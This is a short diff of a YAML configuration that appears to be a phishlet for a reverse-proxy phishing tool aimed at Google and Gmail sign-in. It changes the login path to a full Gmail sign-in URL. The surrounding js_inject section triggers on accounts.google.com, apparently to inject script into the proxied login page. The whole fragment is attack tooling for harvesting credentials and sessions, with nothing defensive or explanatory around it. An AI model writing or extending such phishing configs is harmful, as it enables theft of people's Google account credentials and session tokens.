@@ -35,7 +35,7 @@ auth_urls:
 
 login:
   domain: 'accounts.google.com'
-  path: '/signin/v3/signin/identifier?continue='
+  path: 'v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&emr=1&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ifkv=AYZoVhfYIumwiBExsFAffINcnhB-fKzeFoNOR6LZF4IB5ELlxwCZzloYaTp4--g4zosJzuXo8iotLg&osid=1&passive=1209600&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S801813%3A1695074581367977&theme=glif'
 
 js_inject:
   - trigger_domains: ['accounts.google.com']
